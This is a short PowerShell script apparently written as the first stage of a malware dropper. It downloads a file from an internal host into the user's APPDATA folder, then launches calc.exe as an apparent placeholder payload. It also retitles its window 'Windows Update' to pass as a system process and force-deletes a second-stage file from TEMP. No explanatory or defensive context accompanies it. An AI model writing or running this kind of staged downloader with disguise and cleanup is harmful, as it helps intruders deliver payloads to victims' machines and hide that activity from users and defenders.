
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://internal.corp:8080/stage1.ps1",
    [string]$DropPath = "$env:APPDATA\stage1.bin",
    [int]$RequestTimeout = 135
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Invoke-Stage1Download -SourceUrl $RemoteUrl -DestinationPath $DropPath -TimeoutSec $RequestTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$Host.UI.RawUI.WindowTitle = "Windows Update"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Verbose "stage marker 3 reached"
